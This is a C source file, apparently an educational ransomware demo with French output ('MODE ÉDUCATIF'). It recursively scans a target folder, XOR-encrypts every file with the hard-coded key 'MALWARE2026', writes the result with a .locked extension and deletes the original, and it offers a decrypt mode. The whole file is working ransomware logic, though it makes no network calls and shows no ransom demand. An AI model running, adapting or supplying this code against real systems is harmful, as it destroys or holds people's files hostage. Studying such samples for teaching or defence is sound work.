#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "scanner.h"
#include "xor_crypto.h"

#define KEY "MALWARE2026"

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <encrypt|decrypt> <dossier>\n", argv[0]);
        printf("Exemple: %s encrypt sandbox\n", argv[0]);
        return 1;
    }
    
    int mode_encrypt = (strcmp(argv[1], "encrypt") == 0);
    const char *target = argv[2];
    
    printf("\n╔═══════════════════════════════════════╗\n");
    printf("║  🔒 RANSOMWARE AUTO - MODE ÉDUCATIF  ║\n");
    printf("╚═══════════════════════════════════════╝\n\n");
    
    char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
    if (!files) return 1;
    
    int count = scan_recursive(target, files, MAX_FILES, 0);
    printf("📁 %d fichiers trouvés dans '%s/'\n\n", count, target);
    
    if (count == 0) {
        free(files);
        return 0;
    }
    
    int success = 0;
    
    for (int i = 0; i < count; i++) {
        char output[MAX_PATH];
        
        if (mode_encrypt) {
            if (strstr(files[i], ".locked") != NULL) continue;
            snprintf(output, MAX_PATH, "%s.locked", files[i]);
            
            if (xor_encrypt_file(files[i], output, KEY) == 0) {
                printf("🔒 [%d/%d] Chiffré : %s\n", i+1, count, files[i]);
                remove(files[i]);
                success++;
            }
        } else {
            if (strstr(files[i], ".locked") == NULL) continue;
            strcpy(output, files[i]);
            output[strlen(output) - 7] = '\0';
            
            if (xor_decrypt_file(files[i], output, KEY) == 0) {
                printf("🔓 [%d/%d] Déchiffré : %s\n", i+1, count, output);
                remove(files[i]);
                success++;
            }
        }
    }
    
    printf("\n✅ Terminé : %d/%d fichiers traités\n", success, count);
    
    if (mode_encrypt && success > 0) {
        printf("\n⚠️  FICHIERS CHIFFRÉS !\n");
        printf("Pour déchiffrer : %s decrypt %s\n", argv[0], target);
    }
    
    free(files);
    return 0;
}
